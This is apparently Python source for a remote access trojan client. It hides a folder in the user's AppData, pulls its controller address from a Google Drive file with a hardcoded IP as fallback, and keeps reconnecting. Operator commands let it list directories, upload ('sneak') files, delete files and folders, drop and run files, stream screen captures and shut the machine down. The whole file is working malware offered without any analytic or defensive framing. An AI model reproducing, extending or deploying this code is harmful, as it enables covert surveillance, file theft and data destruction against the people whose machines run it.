import socket
import os
import getpass
from threading import Thread
import sys
import shutil
from mss import mss
from zlib import compress
import time
from google_drive_downloader import GoogleDriveDownloader as g

username = getpass.getuser()

try:
    os.makedirs('C:\\Users\\{}\\Appdata\\Roaming\\Windows'.format(username))
except:
    print('dir exists')

WIDTH = 1920
HEIGHT = 1080

listener_flag = 1
speaker_flag = 1

tosend = 0

action_command = ''
value = ''

screen_on = 0

error_state_listener = 0
error_state_speaker = 0

quiting = 1

def retreive_screenshot(conn):
    with mss() as sct:
        # The region to capture
        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

        while screen_on:
            # Capture the screen
            img = sct.grab(rect)
            # Tweak the compression level here (0-9)
            pixels = compress(img.rgb, 6)

            # Send the size of the pixels length
            size = len(pixels)
            size_len = (size.bit_length() + 7) // 8
            conn.send(bytes([size_len]))

            # Send the actual pixels length
            size_bytes = size.to_bytes(size_len, 'big')
            conn.send(size_bytes)

            # Send pixels
            conn.sendall(pixels)

def listener(conn):
    global txt_response, listener_flag, action_command, value, screen_on, error_state_listener
    while listener_flag == 1:
        if listener_flag == 0:
            break
        try:
            whole_command = conn.recv(1024).decode()
            try:
                action_command, value = whole_command.split(', ')
            except:
                action_command = whole_command
            if screen_on == 1:
                screen_on = int(action_command)
                print('screen on:', screen_on)
            print(action_command, listener_flag)
            if action_command == 'filesend':
                file_size = float(conn.recv(1024).decode())
                full_step = round(file_size / 1024)
                print('full step:', full_step)
                counter = 0
                print(file_size)
                data = conn.recv(1024)
                print(data)
                file = open(value, 'wb')
                if full_step == 0:
                    file.write(data)
                    file.close()

                while True:
                    while data:
                        file.write(data)
                        data = conn.recv(1024)
                        # print(os.path.getsize("C:\\Users\\{}\\Desktop\\recv".format(username)))

                        sys.stdout.write('\r')
                        sys.stdout.write("file receiving:[{}]{}/{}".format('*' * counter + ' ' * (full_step - counter),
                                                                           counter * 1024, file_size))

                        if counter + 1 >= full_step and file_size > 1024:
                            file.write(data)
                            break

                        counter += 1
                    file.close()
                    break
        except:
            print('listener error')
            listener_flag = 0
            speaker_flag = 0
            error_state_listener = 1

def speaker():
    global speaker_flag, listener_flag, action_command, value, screen_on, conn, error_state_speaker, quiting
    while speaker_flag == 1:
        if speaker_flag == 0:
            break
        try:
            time.sleep(0.1)
            if action_command == 'hi':
                print(action_command)
                conn.send('hellothere'.encode())
            elif action_command == 'quit':
                speaker_flag = 0
                listener_flag = 0
                conn.send('quiting'.encode())
                quiting = 0
            elif action_command == 'username':
                conn.send(username.encode())
            elif action_command == 'dirsneak':
                dirs = os.listdir(value)
                conn.send(str(dirs).encode())
                value = ''
            elif action_command == 'filesneak':
                file_size = os.path.getsize(value)
                conn.send(str(file_size).encode())
                file = open(value, 'rb')
                SendData = file.read(1024)
                counter = 0
                while SendData:
                    print('sending')
                    counter += 1
                    print(counter)
                    conn.send(SendData)
                    SendData = file.read(1024)
                file.close()
            elif action_command == 'delete':
                os.remove(value)
                conn.send('file deleted'.encode())
            elif action_command == 'folderdel':
                shutil.rmtree(value)
                conn.send('folder deleted'.encode())
            elif action_command == 'dirmake':
                os.makedirs(value)
                conn.send('directory created'.encode())
            elif action_command == 'startfile':
                os.startfile(value)
                conn.send('file started'.encode())
            elif action_command == 'fileexten':
                filename, targetexten = value.split('->')
                base = os.path.splitext(filename)[0]
                os.rename(filename, base+targetexten)
                conn.send('file extension changed'.encode())
            elif action_command == 'screen':
                screen_on = 1
                time.sleep(1)
                retreive_screenshot(conn)
            elif action_command == 'shutdown':
                os.system('shutdown /s /t 1')

            action_command = ''
        except:
            print('speaker error')
            speaker_flag = 0
            listener_flag = 0
            error_state_speaker = 1

try:
    host_file = g.download_file_from_google_drive(file_id='1Vfr4dlbxbvH7IkGd_NvgshNIDEIDkwyh',
                                                  dest_path='C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ip.txt'.format(
                                                      username))
    host = open('C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ip.txt'.format(username), 'r').read()
    os.remove('C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ip.txt'.format(username))
    print(host)
except:
    host = '168.126.168.229'
    print('no ip file')
port = 3653
connected = 0
while connected == 0:
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((host, port))
        conn.send('Connection established!'.encode())
        connected = 1
    except:
        print('connect fail')

listener_thread = Thread(target=listener, args=(conn,))
speaker_thread = Thread(target=speaker)
listener_thread.start()
speaker_thread.start()

while quiting:
    if error_state_listener == 1 or error_state_speaker == 1:
        try:
            try:
                host_file = g.download_file_from_google_drive(file_id='1Vfr4dlbxbvH7IkGd_NvgshNIDEIDkwyh',
                                                              dest_path='C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ip.txt'.format(
                                                                  username))
                host = open('C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ip.txt'.format(username), 'r').read()
                os.remove('C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ip.txt'.format(username))
                print(host)
            except:
                host = '168.126.168.229'
                print('no ip file')
            port = 3653
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((host, port))
            conn.send('Connection established!'.encode())
            error_state_speaker = 0
            error_state_listener = 0
            listener_flag = 1
            speaker_flag = 1

            tosend = 0

            action_command = ''
            value = ''

            screen_on = 0
            listener_thread = Thread(target=listener, args=(conn,))
            speaker_thread = Thread(target=speaker)
            listener_thread.start()
            speaker_thread.start()

        except:
            print('main error')


